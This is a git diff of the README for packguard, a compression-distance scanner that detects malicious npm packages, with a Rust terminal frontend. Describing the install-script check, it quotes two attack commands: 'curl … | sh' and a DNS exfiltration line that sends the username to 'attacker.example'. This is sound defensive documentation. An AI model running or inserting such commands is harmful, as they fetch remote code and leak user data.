@@ -171,6 +171,8 @@ build/packguard [--mode known|new] [-j threads] [-p candidates] [-m bytes] [-b 0
 
 The references are loaded and their C(x) cached once, then every package is scanned in turn, so many packages per run is much faster than one run per package. Byte-identical reference chunks are scored once: v1 has 190,939 chunks but only 69,249 distinct ones, and this never changes a score. Exit status is 0 on success, 1 if any package failed and 2 for a usage error.
 
+**Folder layout.** The scanner does not create these folders; it expects a fixed structure. The malware reference directory uses `<group>/<package>@<version>/<file>`, the `-B` benign directory is flat (`<package>@<version>/<file>`), and every package path is one package root. See [`docs/folder-layout.md`](docs/folder-layout.md) for the three trees, the exact file and folder rules, and the commands that build them from the shipped zips or the npm corpus.
+
 **Modes.** `--mode known` (v6) is for renamed and mangled known families: `-c 2 -n 1 -e 2 -x 1 -b 1 -t 0.70 -u 0.65 -s 0.50 -g 0.10 -G 0.07 -q 64`, and it needs `-B <benign_dir>` for the benign veto (it warns without it). On the v4 mangling benchmark it flags T1 97.5%, T2 94.2%, T3 94.2% and T4 96.7% of the malware variants and 2.2% of the benign controls (1.3% with `-q 256`, at 700 s instead of 469 s); v5 flagged 35.3% of the benign controls. See [`experiments/v6/`](experiments/v6/README.md). `--mode new` is the new-campaign path: it scores the raw view, adds an install-script/JavaScript behavioural-primitive flag, and does not load the normalised view, at 0.50 ([`experiments/v5/`](experiments/v5/README.md)).
 
 **Benign references.** `-B` loads a second reference set of benign npm code (v6: 5,211 packages, 171 MB of JavaScript, built by `experiments/v6/scripts/build_benign.py`) and scores every chunk against it as well, in both views. A JavaScript or normalised chunk is flagged only when `ncd_malware <= threshold` and `ncd_malware + margin < ncd_benign`; install scripts are judged on their malware distance alone. Malware often ships copies of real libraries and generic stubs, and this two-class rule keeps those from raising alarms. Each chunk in the report adds `benign_ncd` and `benign_match`, and the package adds `benign_vetoed`.
@@ -179,7 +181,7 @@ The references are loaded and their C(x) cached once, then every package is scan
 
 **Repeat collapsing.** With `-x 1`, the normalised view drops every block (cut after each `}` and before each `function`) of 16 or more bytes that occurs 3 or more times in the file, in references and targets alike. Template-generated filler such as inserted dead functions disappears, so padding no longer hides a small malicious file inside a big window. With `-n 1` the report also lists `normalized_chunks`: every normalised chunk with its length, malware and benign distances and verdict.
 
-**Rust CLI/TUI.** [`frontend/`](frontend/README.md) is a small Rust wrapper. It runs the C scanner with the selected mode, reads the JSON reports, and prints a ranked table; `--tui` opens a simple interactive menu.
+**Rust CLI/TUI.** [`frontend/`](frontend/README.md) is a small Rust wrapper. It runs the C scanner with the selected mode, reads the JSON reports, and prints a ranked table; `--tui` opens a full-screen [Cursive](https://github.com/gyscos/cursive) interface modelled on `make menuconfig` (`mconf`): terminal-default colors, a full-width menu, inverse-video selection and a key legend.
 
 ```bash
 cd frontend
@@ -189,7 +191,7 @@ cargo build --release
 ./target/release/packguard-cli --tui --packguard ../build/packguard
 ```
 
-The C scanner must be built first. On Windows use `packguard.exe` and scan only benign code; malware stays inside WSL. The wrapper does not implement detection itself.
+The C scanner must be built first and either be on `PATH` as `packguard` (`packguard.exe` on Windows) or passed with `--packguard`. On Windows use `packguard.exe` and scan only benign code; malware stays inside WSL. The wrapper does not implement detection itself.
 
 **Install scripts.** Many malicious packages carry their whole attack in `package.json`, as a `preinstall`, `install` or `postinstall` command (`curl … | sh`, `nslookup $(whoami).attacker.example`). The scanner reads the `package.json` at the package root, keeps only those three commands, one per line, and scores that text like any other file (it appears as `package.json` in the report). A `package.json` deeper in the package is skipped, since npm never runs its scripts. Reference sets keep no `package.json`; they store the same text as `install_scripts.txt`, which the scanner reads whole.
 
